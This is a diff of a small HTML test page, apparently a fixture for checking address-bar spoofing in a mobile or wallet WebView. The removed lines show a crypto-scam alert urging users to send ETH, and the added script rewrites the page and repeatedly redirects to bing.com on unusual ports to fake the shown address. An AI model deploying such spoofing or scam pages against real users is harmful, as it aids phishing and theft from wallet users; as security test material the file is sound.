@@ -1,8 +1,15 @@
 <html>
     <body>
         <script>
-            alert("Send all your ETH to 0x1337!");
-            ReactNativeWebView.injectedObjectJson();
+            function spoof() {
+                document.write("<h1>This is not bing!</h1>");
+                document.location = "https://bing.com:8081";
+                setInterval(function () {
+                    document.location = "https://bing.com:8080";
+                }, 10000);
+            }
         </script>
+
+        <input type="button" value="Go" onclick="spoof()" />
     </body>
 </html>
